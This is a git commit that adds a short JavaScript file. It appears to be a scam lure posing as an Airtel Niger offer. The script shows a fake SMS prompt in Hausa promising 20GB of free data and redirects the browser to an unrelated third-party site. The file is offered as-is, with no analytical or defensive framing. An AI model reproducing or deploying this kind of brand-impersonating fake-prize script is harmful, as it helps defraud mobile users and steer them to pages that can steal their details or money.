d7e4ca15f318919ebff1fae6e463b0a31505e819
katemj25 <mbokofficial1@gmail.com>
2025-08-03 03:29:40 -0700

    Create airtelniger-free20gb-data.com.js

---
+++ airtelniger-free20gb-data.com.js
@@ -0,0 +1,5 @@
+var password = '20GB data kyauta'
+password=prompt('SMS: Muna tayaku murna da lambar ku ta cancanci samun 20GB kyauta, Daga Airtel, da kyau ku danna OK don kunnawa.. ','20GB data kyauta');
+if (password != '20GB data kyauta') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
